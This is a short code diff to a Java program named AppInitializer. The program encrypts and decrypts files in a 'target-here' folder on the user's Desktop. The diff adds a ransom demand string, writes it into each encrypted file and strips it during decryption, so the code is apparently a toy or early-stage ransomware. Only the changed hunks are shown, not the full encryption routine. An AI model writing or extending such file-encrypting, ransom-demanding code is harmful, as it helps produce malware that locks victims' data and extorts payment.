@@ -2,6 +2,8 @@ import java.io.*;
 
 public class AppInitializer {
 
+    private static String signature = "You bastard!, your file has been encrypted, you have to pay now!";
+
     public static void main(String[] args) throws IOException {
         File targetDir = new File(new File(System.getProperty("user.home"), "Desktop"), "target-here");
         File[] files = targetDir.listFiles();
@@ -21,6 +23,9 @@ public class AppInitializer {
             BufferedInputStream bis = new BufferedInputStream(fis);
             FileOutputStream fos = new FileOutputStream(decryptedFile);
             BufferedOutputStream bos = new BufferedOutputStream(fos);
+
+            byte[] bytes = signature.getBytes();
+            bis.read(bytes);
 
             while (true) {
                 byte[] buffer = new byte[1024 * 10];
@@ -48,6 +53,9 @@ public class AppInitializer {
             BufferedInputStream bis = new BufferedInputStream(fis);
             FileOutputStream fos = new FileOutputStream(encryptedFile);
             BufferedOutputStream bos = new BufferedOutputStream(fos);
+
+            byte[] bytes = signature.getBytes();
+            bos.write(bytes);
 
             while (true) {
                 byte[] buffer = new byte[1024 * 10];
